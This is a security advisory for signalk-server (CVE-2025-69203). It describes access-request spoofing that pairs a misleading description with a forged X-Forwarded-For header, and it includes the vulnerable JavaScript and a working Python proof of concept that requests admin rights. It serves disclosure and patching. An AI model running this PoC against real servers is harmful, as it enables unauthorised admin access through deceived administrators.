# [M] Signal K Server Vulnerable to Access Request Spoofing

## Summary
Severity: Medium
Advisory: GHSA-vfrf-vcj7-wvr8
CVE: CVE-2025-69203
CWE: CWE-290
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-vfrf-vcj7-wvr8
Type: github-advisory

## Affected
- npm: `signalk-server` — affected >=0 <2.19.0

## Details
The SignalK access request system has two related features that when combined by themselves and with the infromation disclosure vulnerability enable convincing social engineering attacks against administrators.

When a device creates an access request, it specifies three fields: `clientId`, `description`, and `permissions`. The SignalK admin UI displays the `description` field prominently to the administrator when showing pending requests, but the actual `permissions` field (which determines the access level granted) is less visible or displayed separately. This allows an attacker to request `admin` permissions while providing a description that suggests readonly access.

The access request handler trusts the `X-Forwarded-For` HTTP header without validation to determine the client's IP address. This header is intended to preserve the original client IP when requests pass through reverse proxies, but when trusted unconditionally, it allows attackers to spoof their IP address. The spoofed IP is displayed to administrators in the access request approval interface, potentially making malicious requests appear to originate from trusted internal network addresses.

Since device/source names can be enumerated via the information disclosure vulnerability, an attacker can impersonate a legitimate device or source, craft a convincing description, spoof a trusted internal IP address, and request elevated permissions, creating a highly convincing social engineering scenario that increases the likelihood of administrator approval.

### Affected Code

**File**: `packages/server-admin-ui/src/views/security/AccessRequests.js`

The admin UI renders access requests showing the description field prominently. The permissions field is displayed but may not be as visually prominent, leading administrators to approve based on the description text.

**File**: `src/tokensecurity.js` (access request creation and IP extraction)

```javascript
// Access request accepts any permissions value from the client
const permissions = req.body.permissions  // No validation against description

// IP address extraction trusts X-Forwarded-For without validation
const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
```

The code prioritizes the `X-Forwarded-For` header over the actual connection IP, allowing client-controlled spoofing.

### Impact

An administrator who trusts device descriptions and IP addresses may inadvertently grant admin privileges to an attacker. The combination of spoofed device name, misleading description, and trusted internal IP address creates a highly convincing social engineering attack. Combined with the token theft vulnerability, this provides a complete authentication bypass requiring only one click from the admin.

### PoC

```python
import requests

TARGET = "http://localhost:3000"
SPOOFED_IP = "192.168.1.100"

def create_spoofed_request(device_name):
    payload = {
        "clientId": device_name,
        "description": f"{device_name} - Read Only",  # Misleading
        "permissions": "admin"  # Actually requesting admin!
    }
    
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": SPOOFED_IP  # Spoof internal IP
    }
    
    r = requests.post(
        f"{TARGET}/signalk/v1/access/requests",
        json=payload,
        headers=headers
    )
    
    if r.status_code == 202:
        data = r.json()
        href = data.get("href")
        request_id = href.split("/")[-1] if href else None
        
        print(f"[+] Access request created!")
        print(f"[+] Request ID: {request_id}")
        print(f"[+] Admin sees: '{payload['description']}'")
        print(f"[+] Actual permissions: {payload['permissions']}")
        print(f"[+] Spoofed IP: {SPOOFED_IP}")
        
        return request_id
    else:
        print(f"[-] Failed: {r.status_code} - {r.text}")
        return None

if __name__ == "__main__":
    # First enumerate devices/sources using info disclosure vulnerability
    sources = requests.get(f"{TARGET}/signalk/v1/api/sources").json()
    devices = [d for d in sources.keys() if d != "defaults"]
    
    if devices:
        print(f"[+] Found devices: {devices}")
        create_spoofed_request(devices[0])
    else:
        create_spoofed_request("sensor-01")
```

### Recommendation

1. Display permissions prominently. The admin UI should prominently display the requested permission level with visual warnings for elevated permissions (readwrite, admin). Consider requiring administrators to explicitly select the permission level during approval rather than accepting the requested value.
2. Validate X-Forwarded-For headers. Only trust `X-Forwarded-For` headers from configured trusted proxy IP addresses. Implement Express.js trust proxy settings or equivalent. Log both the forwarded IP and the actual connection IP for audit purposes.
3. Whitelist device IP addresses. Implement an IP whitelist for access requests, allowing only known device IP addresses to create requests. This prevents external attackers from creating spoofed requests.

## References
- https://github.com/SignalK/signalk-server/security/advisories/GHSA-vfrf-vcj7-wvr8
- https://nvd.nist.gov/vuln/detail/CVE-2025-69203
- https://github.com/SignalK/signalk-server/commit/221aff6cd89c56308084d1781b3abbf938605bd3
- https://github.com/SignalK/signalk-server
- https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
